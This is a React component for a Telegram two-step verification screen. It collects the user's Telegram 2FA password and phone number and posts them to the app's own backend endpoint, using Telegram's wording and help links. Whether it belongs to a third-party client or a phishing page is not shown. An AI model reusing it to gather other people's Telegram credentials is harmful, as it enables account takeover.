import React, { useState, useEffect } from 'react';
import axios from 'axios';

function TwoFactorInput({ phoneNumber, onSubmit }) {
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [passwordStrength, setPasswordStrength] = useState(0);
  const [capsLockOn, setCapsLockOn] = useState(false);
  const [attempts, setAttempts] = useState(0);

  // Check caps lock
  const handleKeyPress = (e) => {
    const capsLock = e.getModifierState && e.getModifierState('CapsLock');
    setCapsLockOn(capsLock);
  };

  // Calculate password strength (just for UI feedback)
  useEffect(() => {
    let strength = 0;
    if (password.length > 0) strength += 1;
    if (password.length >= 8) strength += 1;
    if (/[A-Z]/.test(password)) strength += 1;
    if (/[0-9]/.test(password)) strength += 1;
    if (/[^A-Za-z0-9]/.test(password)) strength += 1;
    setPasswordStrength(Math.min(strength, 4));
  }, [password]);

  const getStrengthLabel = () => {
    const labels = ['Very Weak', 'Weak', 'Fair', 'Good', 'Strong'];
    return labels[passwordStrength];
  };

  const getStrengthColor = () => {
    const colors = ['#ff4444', '#ff7744', '#ffaa44', '#44ff88', '#44ff44'];
    return colors[passwordStrength];
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      const response = await axios.post('/api/auth/two-factor', {
        phoneNumber,
        password
      });

      if (response.data.success) {
        onSubmit();
      }
    } catch (err) {
      console.error('2FA error:', err);
      
      setAttempts(prev => prev + 1);
      
      if (err.response?.data?.message) {
        setError(err.response.data.message);
      } else {
        setError('Invalid password. Please try again.');
      }
      
      // Clear password on error for security
      setPassword('');
      
      // If too many attempts, show lockout warning
      if (attempts >= 2) {
        setError('Multiple failed attempts. Please wait a moment before trying again.');
      }
    } finally {
      setLoading(false);
    }
  };

  const handleForgotPassword = () => {
    window.open('https://telegram.org/faq#q-can-i-recover-access-to-my-account-without-a-phone-number', '_blank');
  };

  return (
    <div className="form-container twofa-container">
      <div className="security-badge">
        <span className="lock-icon">🔒</span>
        <span>Two-Step Verification</span>
      </div>
      
      <h2>Additional Security</h2>
      <p className="subtitle">
        This account has two-step verification enabled.
      </p>
      <p className="phone-number-display">
        {phoneNumber}
      </p>
      
      <form onSubmit={handleSubmit}>
        <div className="password-input-container">
          <div className="input-wrapper">
            <input
              type={showPassword ? "text" : "password"}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              onKeyDown={handleKeyPress}
              placeholder="Enter your 2FA password"
              disabled={loading}
              required
              autoFocus
              className={error ? 'error' : ''}
            />
            <button
              type="button"
              className="toggle-password"
              onClick={() => setShowPassword(!showPassword)}
              tabIndex="-1"
              title={showPassword ? "Hide password" : "Show password"}
            >
              {showPassword ? '👁️' : '👁️‍🗨️'}
            </button>
          </div>
          
          {capsLockOn && (
            <div className="capslock-warning">
              ⚠️ Caps Lock is on
            </div>
          )}
          
          {password && (
            <div className="password-strength">
              <div className="strength-bar">
                <div 
                  className="strength-fill" 
                  style={{ 
                    width: `${(passwordStrength + 1) * 20}%`,
                    backgroundColor: getStrengthColor()
                  }}
                ></div>
              </div>
              <span className="strength-label" style={{ color: getStrengthColor() }}>
                {getStrengthLabel()}
              </span>
            </div>
          )}
        </div>
        
        {error && (
          <div className="error-message">
            <span className="error-icon">❌</span>
            {error}
          </div>
        )}
        
        {attempts > 0 && (
          <div className="attempts-warning">
            Failed attempts: {attempts}/5
          </div>
        )}
        
        <div className="info-box">
          <p>
            <strong>This is your Telegram 2FA password</strong>
            <br />
            Not the login code you received via SMS.
          </p>
        </div>
        
        <button 
          type="submit" 
          disabled={loading || !password}
          className={`submit-btn ${loading ? 'loading' : ''}`}
        >
          {loading ? (
            <>
              <span className="spinner"></span>
              Verifying...
            </>
          ) : (
            'Sign In'
          )}
        </button>
        
        <div className="twofa-links">
          <button 
            type="button" 
            className="link-btn"
            onClick={handleForgotPassword}
          >
            Forgot password?
          </button>
          <button 
            type="button" 
            className="link-btn"
            onClick={() => window.location.reload()}
          >
            Try another way
          </button>
        </div>
      </form>
      
      <div className="security-tip">
        <details>
          <summary>What is two-step verification?</summary>
          <div className="tip-content">
            <p>Two-step verification adds an extra layer of security to your account.</p>
            <p>This password is set by you in Telegram settings.</p>
            <p>If you forgot it, you can reset it via Telegram's official recovery process.</p>
          </div>
        </details>
      </div>
    </div>
  );
}

export default TwoFactorInput;